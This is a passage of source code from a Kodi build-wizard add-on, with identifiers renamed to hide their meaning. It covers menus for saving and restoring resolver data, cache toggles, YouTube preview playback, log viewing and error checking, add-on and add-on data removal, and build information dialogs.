		OO0O0OOO00OOO00O0 =OO0O0OOO00OOO00O0 .replace ('url','URL Resolver')#line:4142
		O0O00O000O0OO000O .append ((THEME2 %OO0O0OOO00OOO00O0 .title (),' '))#line:4143
		O0O00O000O0OO000O .append ((THEME3 %'Save %s Data'%O0000O0000O00OOOO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OO00OO0O00O0OO0OO ,OO000O00OOOO00O00 )))#line:4144
		O0O00O000O0OO000O .append ((THEME3 %'Restore %s Data'%O0000O0000O00OOOO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OO00OO0O00O0OO0OO ,OO000O00OOOO00O00 )))#line:4145
		O0O00O000O0OO000O .append ((THEME3 %'Clear %s Data'%O0000O0000O00OOOO ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,OO00OO0O00O0OO0OO ,OO000O00OOOO00O00 )))#line:4146
	elif O0O0OO0OOO00O0O0O =='save':#line:4147
		O0O00O000O0OO000O =[]#line:4148
		OO00OO0O00O0OO0OO =urllib .quote_plus (OOO00000O000OO000 .lower ().replace (' ',''))#line:4149
		O0000O0000O00OOOO =OOO00000O000OO000 .replace ('Debrid','Real Debrid')#line:4150
		OO000O00OOOO00O00 =urllib .quote_plus (OO0O0OOO00OOO00O0 .lower ().replace (' ',''))#line:4151
		OO0O0OOO00OOO00O0 =OO0O0OOO00OOO00O0 .replace ('url','URL Resolver')#line:4152
		O0O00O000O0OO000O .append ((THEME2 %OO0O0OOO00OOO00O0 .title (),' '))#line:4153
		O0O00O000O0OO000O .append ((THEME3 %'Register %s'%O0000O0000O00OOOO ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,OO00OO0O00O0OO0OO ,OO000O00OOOO00O00 )))#line:4154
		O0O00O000O0OO000O .append ((THEME3 %'Save %s Data'%O0000O0000O00OOOO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OO00OO0O00O0OO0OO ,OO000O00OOOO00O00 )))#line:4155
		O0O00O000O0OO000O .append ((THEME3 %'Restore %s Data'%O0000O0000O00OOOO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OO00OO0O00O0OO0OO ,OO000O00OOOO00O00 )))#line:4156
		O0O00O000O0OO000O .append ((THEME3 %'Import %s Data'%O0000O0000O00OOOO ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,OO00OO0O00O0OO0OO ,OO000O00OOOO00O00 )))#line:4157
		O0O00O000O0OO000O .append ((THEME3 %'Clear Addon %s Data'%O0000O0000O00OOOO ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,OO00OO0O00O0OO0OO ,OO000O00OOOO00O00 )))#line:4158
	elif O0O0OO0OOO00O0O0O =='install':#line:4159
		O0O00O000O0OO000O =[]#line:4160
		OO000O00OOOO00O00 =urllib .quote_plus (OO0O0OOO00OOO00O0 )#line:4161
		O0O00O000O0OO000O .append ((THEME2 %OO0O0OOO00OOO00O0 ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,OO000O00OOOO00O00 )))#line:4162
		O0O00O000O0OO000O .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,OO000O00OOOO00O00 )))#line:4163
		O0O00O000O0OO000O .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,OO000O00OOOO00O00 )))#line:4164
		O0O00O000O0OO000O .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,OO000O00OOOO00O00 )))#line:4165
		O0O00O000O0OO000O .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,OO000O00OOOO00O00 )))#line:4166
	O0O00O000O0OO000O .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4167
	return O0O00O000O0OO000O #line:4168
def toggleCache (OO0O00O0OO000OO0O ):#line:4170
	O0000OOOO0O00OOO0 =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4171
	O000000000O0O00OO =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4172
	if OO0O00O0OO000OO0O in ['true','false']:#line:4173
		for O0OO0OO000OO000O0 in O0000OOOO0O00OOO0 :#line:4174
			wiz .setS (O0OO0OO000OO000O0 ,OO0O00O0OO000OO0O )#line:4175
	else :#line:4176
		if not OO0O00O0OO000OO0O in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4177
			try :#line:4178
				O0OO0OO000OO000O0 =O000000000O0O00OO [O0000OOOO0O00OOO0 .index (OO0O00O0OO000OO0O )]#line:4179
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,O0OO0OO000OO000O0 ))#line:4180
			except :#line:4181
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,OO0O00O0OO000OO0O ))#line:4182
		else :#line:4183
			OO00O0OO000O0OOO0 ='true'if wiz .getS (OO0O00O0OO000OO0O )=='false'else 'false'#line:4184
			wiz .setS (OO0O00O0OO000OO0O ,OO00O0OO000O0OOO0 )#line:4185
def playVideo (O0000000OOOO000O0 ):#line:4187
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%O0000000OOOO000O0 )#line:4188
	if 'watch?v='in O0000000OOOO000O0 :#line:4189
		OOO0OOO000OO0OOO0 ,OO0O00O0OO000OO00 =O0000000OOOO000O0 .split ('?')#line:4190
		O00O0O0O0O0000000 =OO0O00O0OO000OO00 .split ('&')#line:4191
		for OO0O0O000O0O000O0 in O00O0O0O0O0000000 :#line:4192
			if OO0O0O000O0O000O0 .startswith ('v='):#line:4193
				O0000000OOOO000O0 =OO0O0O000O0O000O0 [2 :]#line:4194
				break #line:4195
			else :continue #line:4196
	elif 'embed'in O0000000OOOO000O0 or 'youtu.be'in O0000000OOOO000O0 :#line:4197
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%O0000000OOOO000O0 )#line:4198
		OOO0OOO000OO0OOO0 =O0000000OOOO000O0 .split ('/')#line:4199
		if len (OOO0OOO000OO0OOO0 [-1 ])>5 :#line:4200
			O0000000OOOO000O0 =OOO0OOO000OO0OOO0 [-1 ]#line:4201
		elif len (OOO0OOO000OO0OOO0 [-2 ])>5 :#line:4202
			O0000000OOOO000O0 =OOO0OOO000OO0OOO0 [-2 ]#line:4203
	wiz .log ("YouTube URL: %s"%O0000000OOOO000O0 )#line:4204
	yt .PlayVideo (O0000000OOOO000O0 )#line:4205
def viewLogFile ():#line:4207
	OOO0OOOO0O0OO0OO0 =wiz .Grab_Log (True )#line:4208
	O0O0O00OOOO0OOO00 =wiz .Grab_Log (True ,True )#line:4209
	O00OOO0OO0000OO0O =0 ;OOOOO00O0OO00O0OO =OOO0OOOO0O0OO0OO0 #line:4210
	if not O0O0O00OOOO0OOO00 ==False and not OOO0OOOO0O0OO0OO0 ==False :#line:4211
		O00OOO0OO0000OO0O =DIALOG .select (ADDONTITLE ,["View %s"%OOO0OOOO0O0OO0OO0 .replace (LOG ,""),"View %s"%O0O0O00OOOO0OOO00 .replace (LOG ,"")])#line:4212
		if O00OOO0OO0000OO0O ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4213
	elif OOO0OOOO0O0OO0OO0 ==False and O0O0O00OOOO0OOO00 ==False :#line:4214
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4215
		return #line:4216
	elif not OOO0OOOO0O0OO0OO0 ==False :O00OOO0OO0000OO0O =0 #line:4217
	elif not O0O0O00OOOO0OOO00 ==False :O00OOO0OO0000OO0O =1 #line:4218
	OOOOO00O0OO00O0OO =OOO0OOOO0O0OO0OO0 if O00OOO0OO0000OO0O ==0 else O0O0O00OOOO0OOO00 #line:4220
	O000000O000O0O000 =wiz .Grab_Log (False )if O00OOO0OO0000OO0O ==0 else wiz .Grab_Log (False ,True )#line:4221
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,OOOOO00O0OO00O0OO ),O000000O000O0O000 )#line:4223
def errorChecking (log =None ,count =None ,all =None ):#line:4225
	if log ==None :#line:4226
		OOOO0OOOO00000OO0 =wiz .Grab_Log (True )#line:4227
		OOO0OOOOOOO0O0000 =wiz .Grab_Log (True ,True )#line:4228
		if not OOO0OOOOOOO0O0000 ==False and not OOOO0OOOO00000OO0 ==False :#line:4229
			OOOO0O000O00O0O00 =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(OOOO0OOOO00000OO0 .replace (LOG ,""),errorChecking (OOOO0OOOO00000OO0 ,True ,True )),"View %s: %s error(s)"%(OOO0OOOOOOO0O0000 .replace (LOG ,""),errorChecking (OOO0OOOOOOO0O0000 ,True ,True ))])#line:4230
			if OOOO0O000O00O0O00 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4231
		elif OOOO0OOOO00000OO0 ==False and OOO0OOOOOOO0O0000 ==False :#line:4232
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4233
			return #line:4234
		elif not OOOO0OOOO00000OO0 ==False :OOOO0O000O00O0O00 =0 #line:4235
		elif not OOO0OOOOOOO0O0000 ==False :OOOO0O000O00O0O00 =1 #line:4236
		log =OOOO0OOOO00000OO0 if OOOO0O000O00O0O00 ==0 else OOO0OOOOOOO0O0000 #line:4237
	if log ==False :#line:4238
		if count ==None :#line:4239
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4240
			return False #line:4241
		else :#line:4242
			return 0 #line:4243
	else :#line:4244
		if os .path .exists (log ):#line:4245
			OOOOO0OO0O000O0O0 =open (log ,mode ='r');OO0OO000O00O0O000 =OOOOO0OO0O000O0O0 .read ().replace ('\n','').replace ('\r','');OOOOO0OO0O000O0O0 .close ()#line:4246
			OO0O0O000O0000000 =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (OO0OO000O00O0O000 )#line:4247
			if not count ==None :#line:4248
				if all ==None :#line:4249
					OOO000O0O00OOO0O0 =0 #line:4250
					for OOO00O0O0OO0O0OO0 in OO0O0O000O0000000 :#line:4251
						if ADDON_ID in OOO00O0O0OO0O0OO0 :OOO000O0O00OOO0O0 +=1 #line:4252
					return OOO000O0O00OOO0O0 #line:4253
				else :return len (OO0O0O000O0000000 )#line:4254
			if len (OO0O0O000O0000000 )>0 :#line:4255
				OOO000O0O00OOO0O0 =0 ;O000OOOOO0OO0O0OO =""#line:4256
				for OOO00O0O0OO0O0OO0 in OO0O0O000O0000000 :#line:4257
					if all ==None and not ADDON_ID in OOO00O0O0OO0O0OO0 :continue #line:4258
					else :#line:4259
						OOO000O0O00OOO0O0 +=1 #line:4260
						O000OOOOO0OO0O0OO +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(OOO000O0O00OOO0O0 ,OOO00O0O0OO0O0OO0 .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4261
				if OOO000O0O00OOO0O0 >0 :#line:4262
					wiz .TextBox (ADDONTITLE ,O000OOOOO0OO0O0OO )#line:4263
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4264
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4265
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4266
ACTION_PREVIOUS_MENU =10 #line:4268
ACTION_NAV_BACK =92 #line:4269
ACTION_MOVE_LEFT =1 #line:4270
ACTION_MOVE_RIGHT =2 #line:4271
ACTION_MOVE_UP =3 #line:4272
ACTION_MOVE_DOWN =4 #line:4273
ACTION_MOUSE_WHEEL_UP =104 #line:4274
ACTION_MOUSE_WHEEL_DOWN =105 #line:4275
ACTION_MOVE_MOUSE =107 #line:4276
ACTION_SELECT_ITEM =7 #line:4277
ACTION_BACKSPACE =110 #line:4278
ACTION_MOUSE_LEFT_CLICK =100 #line:4279
ACTION_MOUSE_LONG_CLICK =108 #line:4280
def LogViewer (default =None ):#line:4282
	class O0OOOO00OO0O0O0OO (xbmcgui .WindowXMLDialog ):#line:4283
		def __init__ (OOOO0O00OO00OOO00 ,*OOOO0OOOOOO0O0OO0 ,**O0O0OOOOO00O0OO0O ):#line:4284
			OOOO0O00OO00OOO00 .default =O0O0OOOOO00O0OO0O ['default']#line:4285
		def onInit (OOOO0O0O0000O0OOO ):#line:4287
			OOOO0O0O0000O0OOO .title =101 #line:4288
			OOOO0O0O0000O0OOO .msg =102 #line:4289
			OOOO0O0O0000O0OOO .scrollbar =103 #line:4290
			OOOO0O0O0000O0OOO .upload =201 #line:4291
			OOOO0O0O0000O0OOO .kodi =202 #line:4292
			OOOO0O0O0000O0OOO .kodiold =203 #line:4293
			OOOO0O0O0000O0OOO .wizard =204 #line:4294
			OOOO0O0O0000O0OOO .okbutton =205 #line:4295
			OOO0OOO0OO000O000 =open (OOOO0O0O0000O0OOO .default ,'r')#line:4296
			OOOO0O0O0000O0OOO .logmsg =OOO0OOO0OO000O000 .read ()#line:4297
			OOO0OOO0OO000O000 .close ()#line:4298
			OOOO0O0O0000O0OOO .titlemsg ="%s: %s"%(ADDONTITLE ,OOOO0O0O0000O0OOO .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4299
			OOOO0O0O0000O0OOO .showdialog ()#line:4300
		def showdialog (OO0OOO0OOO00OO00O ):#line:4302
			OO0OOO0OOO00OO00O .getControl (OO0OOO0OOO00OO00O .title ).setLabel (OO0OOO0OOO00OO00O .titlemsg )#line:4303
			OO0OOO0OOO00OO00O .getControl (OO0OOO0OOO00OO00O .msg ).setText (wiz .highlightText (OO0OOO0OOO00OO00O .logmsg ))#line:4304
			OO0OOO0OOO00OO00O .setFocusId (OO0OOO0OOO00OO00O .scrollbar )#line:4305
		def onClick (OO0O0O00OO0O0OO00 ,OOO0O00OOOO0O0OO0 ):#line:4307
			if OOO0O00OOOO0O0OO0 ==OO0O0O00OO0O0OO00 .okbutton :OO0O0O00OO0O0OO00 .close ()#line:4308
			elif OOO0O00OOOO0O0OO0 ==OO0O0O00OO0O0OO00 .upload :OO0O0O00OO0O0OO00 .close ();uploadLog .Main ()#line:4309
			elif OOO0O00OOOO0O0OO0 ==OO0O0O00OO0O0OO00 .kodi :#line:4310
				OOOOO0000O0OOOOO0 =wiz .Grab_Log (False )#line:4311
				O00OOOOOOO00OO0OO =wiz .Grab_Log (True )#line:4312
				if OOOOO0000O0OOOOO0 ==False :#line:4313
					OO0O0O00OO0O0OO00 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4314
					OO0O0O00OO0O0OO00 .getControl (OO0O0O00OO0O0OO00 .msg ).setText ("Log File Does Not Exists!")#line:4315
				else :#line:4316
					OO0O0O00OO0O0OO00 .titlemsg ="%s: %s"%(ADDONTITLE ,O00OOOOOOO00OO0OO .replace (LOG ,''))#line:4317
					OO0O0O00OO0O0OO00 .getControl (OO0O0O00OO0O0OO00 .title ).setLabel (OO0O0O00OO0O0OO00 .titlemsg )#line:4318
					OO0O0O00OO0O0OO00 .getControl (OO0O0O00OO0O0OO00 .msg ).setText (wiz .highlightText (OOOOO0000O0OOOOO0 ))#line:4319
					OO0O0O00OO0O0OO00 .setFocusId (OO0O0O00OO0O0OO00 .scrollbar )#line:4320
			elif OOO0O00OOOO0O0OO0 ==OO0O0O00OO0O0OO00 .kodiold :#line:4321
				OOOOO0000O0OOOOO0 =wiz .Grab_Log (False ,True )#line:4322
				O00OOOOOOO00OO0OO =wiz .Grab_Log (True ,True )#line:4323
				if OOOOO0000O0OOOOO0 ==False :#line:4324
					OO0O0O00OO0O0OO00 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4325
					OO0O0O00OO0O0OO00 .getControl (OO0O0O00OO0O0OO00 .msg ).setText ("Log File Does Not Exists!")#line:4326
				else :#line:4327
					OO0O0O00OO0O0OO00 .titlemsg ="%s: %s"%(ADDONTITLE ,O00OOOOOOO00OO0OO .replace (LOG ,''))#line:4328
					OO0O0O00OO0O0OO00 .getControl (OO0O0O00OO0O0OO00 .title ).setLabel (OO0O0O00OO0O0OO00 .titlemsg )#line:4329
					OO0O0O00OO0O0OO00 .getControl (OO0O0O00OO0O0OO00 .msg ).setText (wiz .highlightText (OOOOO0000O0OOOOO0 ))#line:4330
					OO0O0O00OO0O0OO00 .setFocusId (OO0O0O00OO0O0OO00 .scrollbar )#line:4331
			elif OOO0O00OOOO0O0OO0 ==OO0O0O00OO0O0OO00 .wizard :#line:4332
				OOOOO0000O0OOOOO0 =wiz .Grab_Log (False ,False ,True )#line:4333
				O00OOOOOOO00OO0OO =wiz .Grab_Log (True ,False ,True )#line:4334
				if OOOOO0000O0OOOOO0 ==False :#line:4335
					OO0O0O00OO0O0OO00 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4336
					OO0O0O00OO0O0OO00 .getControl (OO0O0O00OO0O0OO00 .msg ).setText ("Log File Does Not Exists!")#line:4337
				else :#line:4338
					OO0O0O00OO0O0OO00 .titlemsg ="%s: %s"%(ADDONTITLE ,O00OOOOOOO00OO0OO .replace (ADDONDATA ,''))#line:4339
					OO0O0O00OO0O0OO00 .getControl (OO0O0O00OO0O0OO00 .title ).setLabel (OO0O0O00OO0O0OO00 .titlemsg )#line:4340
					OO0O0O00OO0O0OO00 .getControl (OO0O0O00OO0O0OO00 .msg ).setText (wiz .highlightText (OOOOO0000O0OOOOO0 ))#line:4341
					OO0O0O00OO0O0OO00 .setFocusId (OO0O0O00OO0O0OO00 .scrollbar )#line:4342
		def onAction (O0O000OOOO0OO0O00 ,OOO00O0000OOOOO0O ):#line:4344
			if OOO00O0000OOOOO0O ==ACTION_PREVIOUS_MENU :O0O000OOOO0OO0O00 .close ()#line:4345
			elif OOO00O0000OOOOO0O ==ACTION_NAV_BACK :O0O000OOOO0OO0O00 .close ()#line:4346
	if default ==None :default =wiz .Grab_Log (True )#line:4347
	O000O0OOOOOOOO000 =O0OOOO00OO0O0O0OO ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4348
	O000O0OOOOOOOO000 .doModal ()#line:4349
	del O000O0OOOOOOOO000 #line:4350
def removeAddon (OOO0OOO0000OOO0O0 ,O00O0O000000O0O00 ,over =False ):#line:4352
	if not over ==False :#line:4353
		OO00OOOO0O0O00OOO =1 #line:4354
	else :#line:4355
		OO00OOOO0O0O00OOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O00O0O000000O0O00 ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,OOO0OOO0000OOO0O0 ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4356
	if OO00OOOO0O0O00OOO ==1 :#line:4357
		O0O0OO00OOOO0OO0O =os .path .join (ADDONS ,OOO0OOO0000OOO0O0 )#line:4358
		wiz .log ("Removing Addon %s"%OOO0OOO0000OOO0O0 )#line:4359
		wiz .cleanHouse (O0O0OO00OOOO0OO0O )#line:4360
		xbmc .sleep (1000 )#line:4361
		try :shutil .rmtree (O0O0OO00OOOO0OO0O )#line:4362
		except Exception as O00O00OOOOOO0OOOO :wiz .log ("Error removing %s"%OOO0OOO0000OOO0O0 ,xbmc .LOGNOTICE )#line:4363
		removeAddonData (OOO0OOO0000OOO0O0 ,O00O0O000000O0O00 ,over )#line:4364
	if over ==False :#line:4365
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,O00O0O000000O0O00 ))#line:4366
def removeAddonData (OO0O0OOOOOO00OO0O ,name =None ,over =False ):#line:4368
	if OO0O0OOOOOO00OO0O =='all':#line:4369
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4370
			wiz .cleanHouse (ADDOND )#line:4371
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4372
	elif OO0O0OOOOOO00OO0O =='uninstalled':#line:4373
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4374
			OO0OO00O00O000OOO =0 #line:4375
			for OOOOO00O00O0OOOOO in glob .glob (os .path .join (ADDOND ,'*')):#line:4376
				OOO0OOOOOOO0O0OO0 =OOOOO00O00O0OOOOO .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4377
				if OOO0OOOOOOO0O0OO0 in EXCLUDES :pass #line:4378
				elif os .path .exists (os .path .join (ADDONS ,OOO0OOOOOOO0O0OO0 )):pass #line:4379
				else :wiz .cleanHouse (OOOOO00O00O0OOOOO );OO0OO00O00O000OOO +=1 ;wiz .log (OOOOO00O00O0OOOOO );shutil .rmtree (OOOOO00O00O0OOOOO )#line:4380
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OO0OO00O00O000OOO ))#line:4381
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4382
	elif OO0O0OOOOOO00OO0O =='empty':#line:4383
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4384
			OO0OO00O00O000OOO =wiz .emptyfolder (ADDOND )#line:4385
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OO0OO00O00O000OOO ))#line:4386
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4387
	else :#line:4388
		O000OO00O0O0OO0O0 =os .path .join (USERDATA ,'addon_data',OO0O0OOOOOO00OO0O )#line:4389
		if OO0O0OOOOOO00OO0O in EXCLUDES :#line:4390
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4391
		elif os .path .exists (O000OO00O0O0OO0O0 ):#line:4392
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0O0OOOOOO00OO0O ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4393
				wiz .cleanHouse (O000OO00O0O0OO0O0 )#line:4394
				try :#line:4395
					shutil .rmtree (O000OO00O0O0OO0O0 )#line:4396
				except :#line:4397
					wiz .log ("Error deleting: %s"%O000OO00O0O0OO0O0 )#line:4398
			else :#line:4399
				wiz .log ('Addon data for %s was not removed'%OO0O0OOOOOO00OO0O )#line:4400
	wiz .refresh ()#line:4401
def restoreit (OOOOOOO0OO00O0OOO ):#line:4403
	if OOOOOOO0OO00O0OOO =='build':#line:4404
		OO00O000OOOO00000 =freshStart ('restore')#line:4405
		if OO00O000OOOO00000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4406
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4407
		wiz .skinToDefault ()#line:4408
	wiz .restoreLocal (OOOOOOO0OO00O0OOO )#line:4409
def restoreextit (O000O0000OOO0O00O ):#line:4411
	if O000O0000OOO0O00O =='build':#line:4412
		O0O00OO0O000OOO0O =freshStart ('restore')#line:4413
		if O0O00OO0O000OOO0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4414
	wiz .restoreExternal (O000O0000OOO0O00O )#line:4415
def buildInfo (OOO0OOOO0O0O0O00O ):#line:4417
	if wiz .workingURL (SPEEDFILE )==True :#line:4418
		if wiz .checkBuild (OOO0OOOO0O0O0O00O ,'url'):#line:4419
			OOO0OOOO0O0O0O00O ,O0O0O00OO00OO00OO ,OOOO0OOO0O000O0O0 ,O0OOOO0OO00OO0O00 ,O0OOOOOOO000OOOOO ,OOO00OO00OOO00OO0 ,O00O00OO000OO0OO0 ,O0O0O00O0O00000O0 ,O00OOO0OO00OOO0O0 ,O000OO0O000OOOOO0 ,O00000O0OO0O0O0OO =wiz .checkBuild (OOO0OOOO0O0O0O00O ,'all')#line:4420
			O000OO0O000OOOOO0 ='Yes'if O000OO0O000OOOOO0 .lower ()=='yes'else 'No'#line:4421
			O00OO0OO0000000O0 ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOO0OOOO0O0O0O00O )#line:4422
			O00OO0OO0000000O0 +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0O0O00OO00OO00OO )#line:4423
			if not OOO00OO00OOO00OO0 =="http://":#line:4424
				OOO0OOO0O000O0O00 =wiz .themeCount (OOO0OOOO0O0O0O00O ,False )#line:4425
				O00OO0OO0000000O0 +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (OOO0OOO0O000O0O00 ))#line:4426
			O00OO0OO0000000O0 +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OOOOOOO000OOOOO )#line:4427
			O00OO0OO0000000O0 +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O000OO0O000OOOOO0 )#line:4428
			O00OO0OO0000000O0 +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00000O0OO0O0O0OO )#line:4429
			wiz .TextBox (ADDONTITLE ,O00OO0OO0000000O0 )#line:4430
		else :wiz .log ("Invalid Build Name!")#line:4431
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4432
def buildVideo (OO000O0O0OO0OO0OO ):#line:4434
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4435
	if wiz .workingURL (SPEEDFILE )==True :#line:4436
		O00OOO00OO00OO000 =wiz .checkBuild (OO000O0O0OO0OO0OO ,'preview')#line:4437
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%OO000O0O0OO0OO0OO )#line:4438
		if O00OOO00OO00OO000 and not O00OOO00OO00OO000 =='http://':playVideo (O00OOO00OO00OO000 )#line:4439
		else :wiz .log ("[%s]Unable to find url for video preview"%OO000O0O0OO0OO0OO )#line:4440
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4441
def dependsList (OOO0OO00O00OO000O ):#line:4443
	OOO0OOO0O0000OOO0 =os .path .join (ADDONS ,OOO0OO00O00OO000O ,'addon.xml')#line:4444
	if os .path .exists (OOO0OOO0O0000OOO0 ):#line:4445
		O00OOOOO00000OO0O =open (OOO0OOO0O0000OOO0 ,mode ='r');OOO00OO0OO000OOO0 =O00OOOOO00000OO0O .read ();O00OOOOO00000OO0O .close ();#line:4446
		O0O0O0O0O00OO0OOO =wiz .parseDOM (OOO00OO0OO000OOO0 ,'import',ret ='addon')#line:4447
		O0O0O0O0O0OOO0000 =[]#line:4448
